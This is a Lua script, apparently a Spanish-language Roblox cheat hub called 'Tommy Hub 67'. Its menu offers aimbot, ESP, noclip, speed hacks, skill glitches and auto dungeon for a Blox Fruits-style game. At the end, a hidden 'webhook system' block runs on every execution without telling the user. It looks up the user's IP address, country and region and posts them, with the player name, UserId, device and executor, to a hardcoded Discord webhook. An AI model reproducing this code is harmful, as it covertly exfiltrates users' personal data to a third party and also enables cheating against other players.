S1:Toggle({Title = "Team Check", Default = false, Callback = function(state) S.TeamCheck = state end})
S1:Toggle({Title = "Ignore PvP OFF", Default = true, Callback = function(state) S.PvPCheck = state end})
S1:Toggle({Title = "Rainbow Target ESP", Default = false, Callback = function(state) S.Rainbow = state end})
S1:Slider({Title = "Max Dist", Min = 100, Max = 5000, Default = 2500, Rounding = 0, Callback = function(value) S.MaxDist = value end})

local S2 = Section(CombatTab, "Aimbot 67 Descarado (Visible)")
S2:Toggle({Title = "▶ Aimbot 67 Descarado", Desc = "Mueve la cámara con predicción.", Default = false, Callback = function(state) S.A67_Enabled = state end})
S2:Toggle({Title = "Atacar NPCs", Default = true, Callback = function(state) S.A67_TargetNPC = state end})
S2:Toggle({Title = "Atacar Players", Default = false, Callback = function(state) S.A67_TargetPlayer = state end})
S2:Toggle({Title = "Mostrar Marcador", Default = true, Callback = function(state) S.A67_ShowMarker = state end})
S2:Slider({Title = "Predicción", Min = 0, Max = 1, Default = 0.15, Rounding = 2, Callback = function(value) S.A67_Prediction = value end})
S2:Slider({Title = "Distancia Máx", Min = 100, Max = 5000, Default = 1500, Rounding = 0, Callback = function(value) S.A67_MaxDist = value end})

local S3 = Section(CombatTab, "Combate")
S3:Toggle({Title = "Fast Attack", Default = false, Callback = function(state) S.FastAttack = state; if state then startFastAttack() end end})
S3:Toggle({Title = "Anti Stun + Hitbox [Beta]", Default = false, Callback = function(state) setAntiStun(state) end})
S3:Toggle({Title = "Auto Race V4", Default = false, Callback = function(state) S.AutoV4 = state end})

local S4 = Section(CombatTab, "Movimiento")
S4:Toggle({Title = "Walk Speed", Default = false, Callback = function(state) S.WalkSpeed = state end})
S4:Slider({Title = "Speed", Min = 16, Max = 300, Default = 50, Callback = function(value) S.Speed = value end})
S4:Toggle({Title = "Dash Distance", Default = false, Callback = function(state) S.Dash = state; if state then applyDash(S.DashLen) else applyDash(1) end end})
S4:Slider({Title = "Dash", Min = 1, Max = 300, Default = 50, Callback = function(value) S.DashLen = value; if S.Dash then applyDash(value) end end})
S4:Toggle({Title = "Noclip", Default = false, Callback = function(state)
    S.Noclip = state
    if not state and player.Character then
        for _, p in pairs(player.Character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = true end end
    end
end})
S4:Toggle({Title = "Walk on Water", Default = false, Callback = function(state) S.WaterWalk = state end})

--==================== TAB: GLITCHES ====================
local GlitchTab = Window:Tab({Title = "Glitches", Icon = "sparkles"})

local G1 = Section(GlitchTab, "Sanguine Z")
G1:Toggle({Title = "Sanguine Z No Cooldown", Default = false, Callback = function(state)
    S.SangNoCD = state
    local c = player.Character
    if c then c:SetAttribute("AllCooldown", state and 3 or nil) end
end})
G1:Button({Title = "🩸 Sanguine Z Manual", Callback = function() sangManual() end})
G1:Toggle({Title = "Sanguine Z Auto", Default = false, Callback = function(state)
    S.SangAuto = state
    if state then startSangAuto() elseif sangConn then sangConn:Disconnect(); sangConn = nil end
end})
G1:Slider({Title = "Drop Duration", Min = 0.5, Max = 5, Default = 2, Rounding = 1, Callback = function(value) S.SangDrop = value end})

local G2 = Section(GlitchTab, "Trucos")
G2:Toggle({Title = "No Animations", Default = false, Callback = function(state) S.NoAnim = state end})
G2:Toggle({Title = "Super Jump (botón de salto)", Default = false, Callback = function(state) S.SuperJump = state end})
G2:Slider({Title = "Jump Power", Min = 50, Max = 1000, Default = 500, Callback = function(value) S.JumpPower = value end})
G2:Toggle({Title = "Soul Guitar Glitch (Beta)", Default = false, Callback = function(state) S.SoulGuitar = state end})
G2:Slider({Title = "Soul Dash", Min = 1, Max = 300, Default = 121, Callback = function(value) S.SoulDash = value end})
G2:Toggle({Title = "Anti Lava", Default = false, Callback = function(state) S.AntiLava = state end})
G2:Toggle({Title = "Delete Ghost Ship (Sea 2)", Default = false, Callback = function(state) S.DelShip = state end})

--==================== TAB: SORU ====================
local SoruTab = Window:Tab({Title = "Soru", Icon = "zap"})

local SR1 = Section(SoruTab, "Soru")
SR1:Toggle({Title = "Infinite Soru", Default = false, Callback = function(state)
    S.InfSoru = state
    if player.Character then attachInfSoru(player.Character) end
end})
SR1:Toggle({Title = "Soru Aimbot (TP)", Default = false, Callback = function(state) S.SoruAimbot = state end})
SR1:Slider({Title = "Soru Dist", Min = 100, Max = 3500, Default = 1000, Callback = function(value) S.SoruDist = value end})
SR1:Dropdown({Title = "Soru Target", Values = {"Nearest"}, Default = 1, Callback = function(option) S.SoruTarget = option end})

local SR2 = Section(SoruTab, "Combos")
SR2:Toggle({Title = "Portal Soru Combo (X+Z)", Default = false, Callback = function(state) S.PortalSoru = state end})
SR2:Slider({Title = "Portal Soru Delay", Min = 0.05, Max = 2, Default = 0.35, Rounding = 2, Callback = function(value) S.PortalSoruDelay = value end})
SR2:Toggle({Title = "Portal Sanguine C Combo", Default = false, Callback = function(state) S.PortalSangC = state end})
SR2:Slider({Title = "Sanguine C Delay", Min = 0.05, Max = 2, Default = 0.35, Rounding = 2, Callback = function(value) S.PortalSangCDelay = value end})
SR2:Dropdown({Title = "Trigger", Values = {"PortalF", "Soru"}, Default = 1, Callback = function(option) S.PortalSangCTrigger = option end})
SR2:Toggle({Title = "Flashstep Skill Combo", Default = false, Callback = function(state) S.FlashCombo = state end})
SR2:Dropdown({Title = "Arma", Values = {"Melee", "Fruit", "Sword", "Gun"}, Default = 2, Callback = function(option) S.FlashWeapon = option end})
SR2:Dropdown({Title = "Skill Key", Values = {"Z", "X", "C", "V", "F"}, Default = 1, Callback = function(option) S.FlashKey = option end})
SR2:Slider({Title = "Skill Delay", Min = 0.05, Max = 2, Default = 0.3, Rounding = 2, Callback = function(value) S.FlashDelay = value end})

--==================== TAB: ESP ====================
local ESPTab = Window:Tab({Title = "ESP", Icon = "eye"})

local E1 = Section(ESPTab, "ESP & Visuals")
E1:Toggle({Title = "ESP (General)", Default = false, Callback = function(state)
    S.ESP = state
    if not state then for p in pairs(esp) do clearESP(p) end end
end})
E1:Toggle({Title = "Show Name", Default = true, Callback = function(state) S.ESPName = state end})
E1:Toggle({Title = "Show Level", Default = true, Callback = function(state) S.ESPLevel = state end})
E1:Toggle({Title = "Show Bounty / PvP", Default = true, Callback = function(state) S.ESPBounty = state end})
E1:Toggle({Title = "Show Devil Fruit", Default = true, Callback = function(state) S.ESPFruit = state end})
E1:Toggle({Title = "Show Distance", Default = true, Callback = function(state) S.ESPDist = state end})
E1:Toggle({Title = "Show HP %", Default = true, Callback = function(state) S.ESPHP = state end})
E1:Toggle({Title = "Highlight Players", Default = false, Callback = function(state) S.ESPHighlight = state end})
E1:Slider({Title = "Text Size", Min = 8, Max = 32, Default = 12, Rounding = 0, Callback = function(value) S.ESPSize = value end})

--==================== TAB: DUNGEONS ====================
local DungeonTab = Window:Tab({Title = "Dungeons", Icon = "castle"})

local D1 = Section(DungeonTab, "Auto Dungeon")
D1:Toggle({Title = "▶ Auto Dungeon (Start/Stop)", Default = false, Callback = function(state) S.AutoDungeon = state; dgSet(state) end})
D1:Dropdown({Title = "Arma", Values = {"Sword", "Melee", "Blox Fruit"}, Default = 1, Callback = function(option) S.DungeonWeapon = option end})
D1:Slider({Title = "Altura de ataque", Min = 10, Max = 100, Default = 40, Rounding = 0, Callback = function(value) S.DungeonHeight = value end})
D1:Toggle({Title = "Auto V4 (tecla Y)", Default = false, Callback = function(state) S.DungeonV4 = state end})

--==================== TAB: MISC ====================
local MiscTab = Window:Tab({Title = "Misc", Icon = "settings"})

local M1 = Section(MiscTab, "Config")

local HttpService = game:GetService("HttpService")
local CONFIG_FILE = "TommyHub67_Config.json"

local function saveConfig()
    if not writefile then return false end
    local conf = {}
    for k, v in pairs(S) do if k ~= "SoruTarget" then conf[k] = v end end
    return pcall(function() writefile(CONFIG_FILE, HttpService:JSONEncode(conf)) end)
end
local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return false end
    local ok, conf = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(conf) ~= "table" then return false end
    for k, v in pairs(conf) do
        if k ~= "SoruTarget" and S[k] ~= nil and type(v) == type(S[k]) then S[k] = v end
    end
    return true
end

M1:Button({Title = "💾 Guardar Config", Callback = function()
    local ok = saveConfig()
    Window:Notification({Title = "Config", Content = ok and "Configuración guardada" or "Error al guardar", Duration = 3})
end})
M1:Button({Title = "📂 Cargar Config", Callback = function()
    local ok = loadConfig()
    Window:Notification({Title = "Config", Content = ok and "Configuración cargada" or "No hay config guardada", Duration = 3})
end})

--==================== TAB: INTERFAZ ====================
local UITab = Window:Tab({Title = "Interfaz", Icon = "palette"})

local U1 = Section(UITab, "🎨 Tema Predefinido")
U1:Dropdown({
    Title = "Tema de Interfaz",
    Values = {"Dark", "Light", "Rose", "Pro", "Aqua", "Mint", "Sunset", "Violet", "Crimson", "Blood"},
    Default = 1,
    Callback = function(option) pcall(function() Window:SetTheme(option) end) end,
})

local U2 = Section(UITab, "🎨 Colores Personalizados")
U2:Colorpicker({
    Title = "Color de Acento",
    Default = Color3.fromRGB(140, 90, 255),
    Transparency = false,
    Callback = function(color)
        pcall(function()
            if Window.Frame then
                for _, v in ipairs(Window.Frame:GetDescendants()) do
                    pcall(function()
                        if v:IsA("Frame") then
                            local n = v.Name:lower()
                            if n:find("accent") or n:find("toggle") or n:find("fill") or n:find("selected") then
                                v.BackgroundColor3 = color
                            end
                        elseif v:IsA("UIStroke") then
                            local n = v.Name:lower()
                            if n:find("accent") or n:find("outline") then v.Color = color end
                        elseif v:IsA("TextLabel") then
                            local n = v.Name:lower()
                            if n:find("accent") or n:find("selected") then v.TextColor3 = color end
                        end
                    end)
                end
            end
        end)
    end,
})

U2:Colorpicker({
    Title = "Color de Fondo",
    Default = Color3.fromRGB(15, 15, 22),
    Transparency = false,
    Callback = function(color)
        pcall(function()
            if Window.Frame then
                for _, v in ipairs(Window.Frame:GetDescendants()) do
                    pcall(function()
                        if v:IsA("Frame") and v.Name:lower():find("background") then v.BackgroundColor3 = color end
                    end)
                end
            end
        end)
    end,
})

U2:Colorpicker({
    Title = "Color de Texto",
    Default = Color3.fromRGB(240, 240, 250),
    Transparency = false,
    Callback = function(color)
        pcall(function()
            if Window.Frame then
                for _, v in ipairs(Window.Frame:GetDescendants()) do
                    pcall(function()
                        if v:IsA("TextLabel") then v.TextColor3 = color end
                    end)
                end
            end
        end)
    end,
})

local U3 = Section(UITab, "🎛️ Transparencia")
U3:Slider({
    Title = "Transparencia de Ventana",
    Min = 0, Max = 100, Default = 0, Rounding = 0,
    Callback = function(value)
        pcall(function()
            if Window.Frame then Window.Frame.BackgroundTransparency = value / 100 end
        end)
    end,
})

if loadConfig() then print("✅ Tommy Hub 67: config cargada automáticamente") end

--==================== CLEANUP ====================
local function cleanup()
    alive = false
    S.SkillAimbot = false; S.A67_Enabled = false; S.AutoDungeon = false
    setAntiStun(false)
    for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
    for p in pairs(esp) do clearESP(p) end
    if rainbowHL then rainbowHL:Destroy() end
    if A67_marker then A67_marker:Destroy() end
    applyDash(1)
    pcall(function() if Window and Window.Destroy then Window:Destroy() end end)
    env.TommyHub67 = nil
end
env.TommyHub67 = cleanup

track(UIS.InputBegan:Connect(function(i, gp)
    if not gp and i.KeyCode == Enum.KeyCode.F4 then
        pcall(function() Window:Toggle() end)
    end
end))

print("✅ TOMMY HUB 67 (WindUI Edition) cargado correctamente")

-- ================= 🔥 TOMMY HUB WEBHOOK SYSTEM =================
do
    local HttpService = game:GetService("HttpService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1453695404394979358v/5xnbL5Pz4dnjH2Uwoflue37adQX01d-Jb0V3j7L2P20T0UyF3BxLZ1ugan7U0sqv"

    local execCount = 1
    pcall(function()
        if getgenv then
            local g = getgenv()
            if typeof(g.TommyExecCount) == "number" then
                g.TommyExecCount = 1
            else
                g.TommyExecCount += 1
            end
            execCount = g.TommyExecCount
        end
    end)
    if not execCount or execCount < 1 then execCount = 1 end

    local function GetTime() return os.date("%Y-%m-%d %H:%M:%S") end
    local function GetDevice()
        if UIS.TouchEnabled and not UIS.KeyboardEnabled then return "Móvil"
        elseif UIS.GamepadEnabled then return "Consola"
        else return "PC" end
    end
    local function GetGameName()
        local name = "Desconocido"
        pcall(function() name = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
        return name
    end
    local function GetIPData()
        local ok, res = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
        if not ok then return nil end
        local data = HttpService:JSONDecode(res)
        return {ip = data.query or "N/A", country = data.country or "N/A", region = data.regionName or "N/A"}
    end
    local function GetExecutor()
        local name = "Desconocido"
        pcall(function()
            if type(identifyexecutor) == "function" then name = identifyexecutor()
            elseif type(getexecutorname) == "function" then name = getexecutorname()
            elseif getgenv then
                local g = getgenv()
                if rawget(g, "Xeno") then name = "Xeno"
                elseif rawget(g, "Solara") then name = "Solara" end
            elseif syn then name = "Synapse"
            elseif KRNL_LOADED then name = "KRNL"
            elseif Fluxus then name = "Fluxus"
            elseif secure_load then name = "Sentinel" end
        end)
        return tostring(name or "Desconocido")
    end

    local function SendWebhook(info)
        pcall(function()
            if not request then return end
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    content = "@everyone",
                    embeds = {{
                        title = "🔥 TOMMY HUB 67 (WindUI) EJECUTADO",
                        color = 65280,
                        fields = {
                            {name="Jugador", value=player.Name, inline=true},
                            {name="UserId", value=tostring(player.UserId), inline=true},
                            {name="Hora", value=GetTime(), inline=true},
                            {name="Dispositivo", value=GetDevice(), inline=true},
                            {name="Juego", value=GetGameName(), inline=true},
                            {name="Executor", value=GetExecutor(), inline=true},
                            {name="Ejecuciones", value=tostring(execCount), inline=true},
                            {name="IP", value=info.ip, inline=true},
                            {name="País", value=info.country, inline=true},
                            {name="Región", value=info.region, inline=true},
                        },
                        footer = {text="Tommy Hub System"}
                    }}
                })
            })
        end)
    end

    local info = GetIPData() or {ip="N/A", country="N/A", region="N/A"}
    SendWebhook(info)
    print("🔥 Tommy Hub67 @everyone Activado")
end
